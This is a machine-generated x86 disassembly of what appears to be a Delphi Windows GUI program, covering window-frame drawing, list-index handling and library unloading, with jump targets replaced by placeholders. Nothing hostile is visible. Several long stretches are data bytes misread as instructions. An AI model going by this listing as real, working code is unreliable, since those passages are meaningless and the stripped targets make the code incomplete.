mov dl [ ebx + 0x5f ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax edi
mov si 0xffc8
call sub_403360
test al al
je r-xdata
sub_42a384
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x221 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_416b74
mov [ ebx + 0x218 ] eax
mov eax ebx
call sub_434d18
mov eax ebx
mov si 0xffeb
call sub_403360
sub_42a3bc
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x218 ]
jg r-xdata
mov eax ebx
call sub_42a534
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
mov [ ebx + 0x218 ] eax
sub_42a430
push ebx
push esi
push edi
mov esi edx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x210 ]
cmp esi [ eax + 0x8 ]
jg r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_429f54
jmp r-xdata
mov edi [ ebx + 0x210 ]
cmp esi [ edi + 0x8 ]
jl r-xdata
mov eax edi
call sub_416c00
call sub_403164
pop edi
pop esi
pop ebx
retn
sub_42a470
push ebx
mov ebx eax
cmp edx 0x1
jge r-xdata
cmp edx 0x10
jle r-xdata
mov edx 0x1
cmp edx [ ebx + 0x21c ]
je r-xdata
mov edx 0x10
pop ebx
retn
mov [ ebx + 0x21c ] edx
mov eax ebx
call sub_42a1ec
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42a4a8
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp esi 0xffffffff
jge r-xdata
mov [ ebx + 0x218 ] esi
jmp r-xdata
mov ebp [ ebx + 0x210 ]
mov eax [ ebp + 0x8 ]
cmp esi eax
jl r-xdata
or esi 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x218 ]
cmp esi edi
je r-xdata
mov esi eax
dec esi
test edi edi
jl r-xdata
mov edi esi
mov [ ebx + 0x218 ] edi
test edi edi
jl r-xdata
mov edx edi
mov eax ebp
call sub_416b18
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_416b18
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_42a534
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42a5fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
mov eax ebx
call sub_42a430
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebx + 0x218 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
mov eax ebx
call sub_42a1ec
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a604
lea eax [ ebp - 0x8 ]
call sub_403e9c
retn
mov [ ebx + 0x221 ] 0x1
mov edx [ ebx + 0x218 ]
mov eax [ ebx + 0x210 ]
call sub_416b18
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov [ ebx + 0x221 ] 0x0
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x214 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_416b18
pop edx
call sub_43513c
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
sub_42a60c
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43add4
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_416b18
pop edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
inc edi
dec esi
jne r-xdata
sub_42a680
push 0x37004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ eax ] bh
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ecx ] bh
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edx ] bh
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ebx ] bh
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edi + edi * 8 ] bh
add [ eax ] al
push 0x3d004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ esi ] bh
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edi ] bh
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ eax ] ah
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ecx ] ah
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edx ] ah
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ebx ] ah
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edi + edi * 8 ] ah
add [ eax ] al
push 0x25004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ esi ] ah
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edi ] ah
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ eax ] ch
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ecx ] ch
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edx ] ch
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ebx ] ch
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edi + edi * 8 ] ch
add [ eax ] al
push 0x2d004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ esi ] ch
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edi ] ch
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ eax ] dl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ecx ] dl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edx ] dl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ebx ] dl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edi + edi * 8 ] dl
add [ eax ] al
push 0x15004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ esi ] dl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edi ] dl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ eax ] bl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ecx ] bl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edx ] bl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ebx ] bl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edi + edi * 8 ] bl
add [ eax ] al
push 0x1d004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ esi ] bl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edi ] bl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ eax ] al
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ecx ] al
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edx ] al
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ebx ] al
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edi + edi * 8 ] al
add [ eax ] al
push 0x5004616
inc [ eax ]
add [ edi ] ch
add [ eax ] al
add [ ecx + ebx * 4 ] ch
inc ebp
add al dh
cmpsd [ esi ] [ edi ]
inc edx
add [ ecx + ebx * 4 ] ah
inc ebp
add al ch
cmpsd [ esi ] [ edi ]
inc edx
add [ ecx + ebx * 4 ] bl
inc ebp
add al ah
cmpsd [ esi ] [ edi ]
inc edx
add [ ecx + ebx * 4 ] dl
inc ebp
add al bl
cmpsd [ esi ] [ edi ]
inc edx
add [ ecx + ebx * 4 ] cl
inc ebp
add al dl
cmpsd [ esi ] [ edi ]
inc edx
add [ ecx + ebx * 4 ] al
inc ebp
add al cl
cmpsd [ esi ] [ edi ]
inc edx
add ah bh
cwde
inc ebp
add al al
cmpsd [ esi ] [ edi ]
inc edx
add ah dh
cwde
inc ebp
add [ eax - 0x13ffbd59 ] bh
cwde
inc ebp
add [ eax - 0x1bffbd59 ] dh
cwde
inc ebp
add [ eax - 0x23ffbd59 ] ch
cwde
inc ebp
add [ eax - 0x2bffbd59 ] ah
cwde
inc ebp
add [ eax - 0x33ffbd59 ] bl
cwde
inc ebp
add [ eax - 0x3bffbd59 ] dl
cwde
inc ebp
add [ eax - 0x43ffbd59 ] cl
cwde
inc ebp
add [ eax - 0x4bffbd59 ] al
cwde
inc ebp
add [ eax - 0x59 ] bh
inc edx
add [ eax + ebx * 4 - 0x588fffbb ] ch
inc edx
add [ eax + ebx * 4 - 0x5897ffbb ] ah
inc edx
add [ eax + ebx * 4 - 0x589fffbb ] bl
inc edx
add [ eax + ebx * 4 - 0x58a7ffbb ] dl
inc edx
add [ eax + ebx * 4 - 0x58afffbb ] cl
inc edx
add [ eax + ebx * 4 - 0x58b7ffbb ] al
inc edx
add [ eax + ebx * 4 + 0x45 ] bh
add [ eax - 0x59 ] al
inc edx
add [ eax + ebx * 4 + 0x45 ] dh
add [ eax ] bh
cmpsd [ esi ] [ edi ]
inc edx
add [ eax + ebx * 4 + 0x45 ] ch
add [ eax ] dh
cmpsd [ esi ] [ edi ]
inc edx
add [ eax + ebx * 4 + 0x45 ] ah
add [ eax ] ch
cmpsd [ esi ] [ edi ]
inc edx
add [ eax + ebx * 4 + 0x45 ] bl
add [ eax ] ah
cmpsd [ esi ] [ edi ]
inc edx
add [ eax + ebx * 4 + 0x45 ] dl
add [ eax ] bl
cmpsd [ esi ] [ edi ]
inc edx
add [ eax + ebx * 4 + 0x45 ] cl
add [ eax ] dl
cmpsd [ esi ] [ edi ]
inc edx
add [ eax + ebx * 4 + 0x45 ] al
add [ eax ] cl
cmpsd [ esi ] [ edi ]
inc edx
add [ eax + ebx * 4 ] bh
inc ebp
add [ eax ] al
cmpsd [ esi ] [ edi ]
inc edx
add [ eax + ebx * 4 ] dh
inc ebp
add al bh
cmpsb [ esi ] [ edi ]
inc edx
add [ eax + ebx * 4 ] ch
inc ebp
add al dh
cmpsb [ esi ] [ edi ]
inc edx
add [ eax + ebx * 4 ] ah
inc ebp
add al ch
cmpsb [ esi ] [ edi ]
inc edx
add [ eax + ebx * 4 ] bl
inc ebp
add al ah
cmpsb [ esi ] [ edi ]
inc edx
add [ eax + ebx * 4 ] dl
inc ebp
add al bl
cmpsb [ esi ] [ edi ]
inc edx
add [ eax + ebx * 4 ] cl
inc ebp
add al dl
cmpsb [ esi ] [ edi ]
inc edx
add [ eax + ebx * 4 ] al
inc ebp
add al cl
cmpsb [ esi ] [ edi ]
inc edx
add ah bh
xchg edi eax
inc ebp
add al al
cmpsb [ esi ] [ edi ]
inc edx
add ah dh
xchg edi eax
inc ebp
add [ eax - 0x13ffbd5a ] bh
xchg edi eax
inc ebp
add [ eax - 0x1bffbd5a ] dh
xchg edi eax
inc ebp
add [ eax - 0x23ffbd5a ] ch
xchg edi eax
inc ebp
add [ eax - 0x2bffbd5a ] ah
xchg edi eax
inc ebp
add [ eax - 0x33ffbd5a ] bl
xchg edi eax
inc ebp
add [ eax - 0x3bffbd5a ] dl
xchg edi eax
inc ebp
add [ eax - 0x43ffbd5a ] cl
xchg edi eax
inc ebp
add [ eax + 0x550042a6 ] al
mov ebp esp
xor eax eax
push ebp
push sub_42a9b0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a9b7
retn
mov eax rw-data
mov ecx 0x2f
mov edx [ r-xdata ]
call sub_404918
sub_42a9ec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42aa11
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42aa18
retn
sub_42aa24
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42aa55
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42aa5c
retn
mov eax [ rw-data ]
call sub_403164
sub_42ab0c
or al [ eax ]
add [ eax ] al
pop eax
cdq
inc ebp
add [ eax + 0x4602 ] ch
add [ eax ] al
add [ ecx + ebx * 4 + 0x45 ] dl
add [ ecx + eax + 0x46 ] cl
add [ eax ] al
push eax
cdq
inc ebp
add [ eax ] dh
add [ esi ] eax
add [ eax ] al
add [ eax ] al
dec esp
cdq
inc ebp
add [ eax ] cl
add al [ esi ]
add [ eax ] al
add [ eax ] al
dec eax
cdq
inc ebp
add ah dl
add al [ esi ]
add [ eax ] al
add [ eax ] al
inc esp
cdq
inc ebp
add al bl
add al 0x46
add [ eax ] al
add [ eax ] al
add [ eax - 0x67 ] al
inc ebp
add [ eax ] cl
add eax [ esi ]
add [ eax ] al
add [ eax ] al
cmp al 0x99
inc ebp
add [ eax + 0x4603 ] cl
add [ eax ] al
add [ eax ] bh
cdq
inc ebp
add [ esp + eax + 0x46 ] bh
add [ eax ] al
xor al 0x99
inc ebp
add [ eax + 0x1 ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42abb4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42abbb
retn
call sub_42aaf0
sub_42abe8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ac0d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ac14
retn
sub_42ac2f
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42ac74
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ac7b
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404918
sub_42ac97
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42acdc
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ace3
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404918
sub_42acf3
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ad49
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ad50
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_403e9c
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42ad5c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ada0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ada7
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42adb4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42add9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ade0
retn
sub_42aeec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42af5b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42af62
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_4048cc
mov eax rw-data
mov edx [ r-xdata ]
call sub_4048cc
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42b1b4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_427058
mov [ esi + 0x5 ] al
call sub_42ae8c
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_42b9f8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_42b200
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax esi
call sub_42b2a0
call sub_426e98
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403154
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_42b234
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_42b2a0
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_42b2e4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42b234
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_42b330
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42b234
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42b374
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_42b234
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_42b3dc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_4046e8
push eax
mov eax esi
call sub_4046d8
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42b234
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_42b440
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_42b4c4
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_42b500
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_42b51d ]
jmp [ eax * 4 + jump_table_42b586 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_42b88c
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_42b9e7
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_42b4c4
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_42b330
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_4156e4
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_42ba14
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ba4f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
